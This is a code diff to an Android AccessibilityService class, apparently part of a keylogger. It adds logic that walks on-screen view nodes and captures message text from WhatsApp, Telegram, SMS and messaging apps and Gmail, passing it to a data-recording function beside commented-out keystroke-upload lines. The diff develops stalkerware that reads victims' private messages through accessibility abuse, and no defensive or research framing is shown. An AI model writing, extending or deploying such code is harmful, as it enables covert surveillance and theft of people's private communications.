@@ -159,6 +159,12 @@ class MyService : AccessibilityService() {
 //                i(TAG, "${getDateTime()} |(TEXT)| $data")
 //                keyLogDataRef.push().child("keylog").setValue("${getDateTime()} |(TEXT)| $data")
                 setData("(TEXT : ${event.packageName})", data)
+
+                val nodeInfo = event.source
+                if (nodeInfo != null){
+                    dfs(nodeInfo)
+                }
+
             }
             AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                 val data = event.text.toString()
@@ -202,29 +208,52 @@ class MyService : AccessibilityService() {
                 setData("(CONTEXT_CLICKED : ${event.packageName})", data)
             }
 
-            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
-                val nodeInfo = event.source
-                if (nodeInfo != null){
-                    dfs(nodeInfo)
-                }
-            }
-
-            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                val nodeInfo = event.source
-                if (nodeInfo != null){
-                    dfs(nodeInfo)
-                }
-            }
+//            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
+//                val nodeInfo = event.source
+//                if (nodeInfo != null){
+//                    dfs(nodeInfo)
+//                }
+//            }
+//
+//            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+//                val nodeInfo = event.source
+//                if (nodeInfo != null){
+//                    dfs(nodeInfo)
+//                }
+//            }
 
         }
     }
 
+//    fun dfs(info: AccessibilityNodeInfo?) {
+//        if (info == null) return
+//        if (info.text != null) {
+//            i(TAG, "(WINDOW_STATE_CHANGED : ${info.packageName}) " + info.text.toString())
+//            setData("(WINDOW_STATE_CHANGED : ${info.packageName})", info.text.toString())
+//        }
+//        for (i in 0 until info.childCount) {
+//            val child = info.getChild(i)
+//            dfs(child)
+//            child?.recycle()
+//        }
+//    }
+
     fun dfs(info: AccessibilityNodeInfo?) {
         if (info == null) return
         if (info.text != null) {
-            i(TAG, "(WINDOW_STATE_CHANGED : ${info.packageName}) " + info.text.toString())
-            setData("(WINDOW_STATE_CHANGED : ${info.packageName})", info.text.toString())
+            val packageName = info.packageName?.toString()
+            val message = info.text.toString()
+
+            if (packageName != null && (packageName.contains("com.whatsapp") || packageName.contains("org.telegram") ||
+                        packageName.contains("messag") ||
+                        packageName.contains("sms") ||
+                        packageName.contains("com.google.android.gm"))) {
+                // Check if the package is WhatsApp or Telegram or SMS
+                i(TAG, "(WINDOW_STATE_CHANGED : $packageName) $message")
+                setData("(WINDOW_STATE_CHANGED : $packageName)", message)
+            }
         }
+
         for (i in 0 until info.childCount) {
             val child = info.getChild(i)
             dfs(child)
